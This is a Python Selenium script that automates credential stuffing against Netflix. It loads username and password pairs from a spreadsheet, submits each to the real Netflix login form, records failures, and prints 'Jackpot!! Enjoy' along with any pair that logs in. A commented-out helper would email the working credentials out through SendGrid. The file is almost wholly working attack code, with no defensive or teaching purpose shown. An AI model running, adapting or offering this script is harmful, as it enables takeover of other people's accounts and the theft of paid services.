import os
import time

import openpyxl
from selenium import webdriver
from selenium.webdriver.common.by import By


# from sendgrid.models import Email


def netflix_auto():
    global user_error
    book = openpyxl.load_workbook(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'Netflix-Data.xlsx'))
    sheet = book.active
    dict_data = {}
    list_data = []

    try:
        for i in range(2, sheet.max_row + 1):
            for j in range(1, sheet.max_column + 1):
                dict_data[sheet.cell(row=1, column=j).value] = sheet.cell(row=i, column=j).value
            list_data.append(dict_data.copy())
        print(list_data)
    except Exception as e:
        print(f"Cannot Read File due to {e} Exception")

    try:
        i = 0
        n = 0
        found = False
        infinite = sheet.max_row // 5
        while n < infinite:
            # chromeOptions = webdriver.ChromeOptions()
            # chromeOptions.add_argument("headless")
            driver = webdriver.Chrome(os.path.join(os.path.dirname(os.path.abspath(__file__)), 'chromedriver.exe'))
            # driver = webdriver.Firefox(
            #     executable_path=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'geckodriver.exe'))
            driver.get("https://www.netflix.com/in/login")
            driver.maximize_window()
            driver.implicitly_wait(5)
            for i in range(i, 10 + i):
                email_field = driver.find_element(by=By.ID, value="id_userLoginId")
                pass_field = driver.find_element(by=By.ID, value="id_password")
                show_pass_toggle = driver.find_element(by=By.ID, value="id_password_toggle")
                login_field = driver.find_element(by=By.XPATH, value="//button[@type='submit']")
                if list_data[i]["Status"] == "Not Tested":
                    email_field.clear()
                    email_field.send_keys(list_data[i]["UserName"])
                    pass_field.click()
                    show_pass_toggle.click()
                    pass_field.send_keys(list_data[i]["Password"])
                    time.sleep(.5)
                    login_field.click()
                    time.sleep(5)
                if len(driver.find_elements(by=By.XPATH, value="//div[@class='ui-message-icon']")) > 0:
                    status_address = 'C'+str(i+2)
                    sheet[status_address] = "Failed"
                    book.save('Netflix-Data.xlsx')
                    continue
                elif len(driver.find_elements(by=By.XPATH, value="//div[@class='profile-gate-label']")) > 0:
                    uid = list_data[i]["UserName"]
                    password = list_data[i]["Password"]
                    print("Jackpot!! Enjoy")
                    print("The User Id is: {}".format(list_data[i - 1]["UserName"]))
                    print("The Password is: {}".format(list_data[i - 1]["Password"]))
                    driver.quit()
                    # send_mail(list_data[i - 1]["UserName"], list_data[i - 1]["Password"])
                    found = True
                    break
                elif len(driver.find_elements(by=By.XPATH, value="//a[@href='/login']")) > 0:
                    signin = driver.find_element(by=By.XPATH, value="//a[@href='/login']")
                    signin.click()
                    time.sleep(5)
                    continue
                else:
                    signout = driver.find_element(by=By.XPATH, value="//a[@href='/signout']")
                    signout.click()
                    time.sleep(5)
                    signin = driver.find_element(by=By.XPATH, value="//a[@href='/login']")
                    signin.click()
                    time.sleep(5)
                    continue
            # print(i)
            print("Not yet buddy! Keep Searching")
            user_error = list_data[i]["UserName"]
            driver.quit()
            if found:
                break
            else:
                continue
    except Exception as e:
        print(f"Opps! Something went wrong in ID {user_error} due to {e} Exception")


# def send_mail(username, password):
#     try:
#         body = []
#         subject = "Netflix ID Found!!!"
#         body += f"<p>Please find the Netflix working ID below:-<br />User Id is:
#         ${username}</p><p>Password is: ${password}</p>"
#         body += "<br><br>Regards,<br>Automation KS <br>This is an auto-generated E-mail."
#
#         sg = sendgrid.SendGridAPIClient()
#         from_email = Email(mailing_list.address_book['from'])
#         to_email = Email(mailing_list.address_book['to'])
#         content = Content("text/html", body)
#         mail = Email(from_email, subject, to_email)
#         personalization = Personalization()
#
#         personalization.add_to(Email(mailing_list.address_book['to']))
#         [personalization.add_cc(Email(email_id)) for email_id in mailing_list.address_book['cc']]
#         mail.add_personalization(personalization)
#         print('Email configured')
#         try:
#             print('Sending Email')
#             response = sg.client.mail.send.post(request_body=mail.get())
#             print(response.status_code)
#         except Exception as e:
#             print(str(e))
#             exit()
#     except Exception as e:
#         raise Exception("Unable to send email")

if __name__ == '__main__':
    netflix_auto()
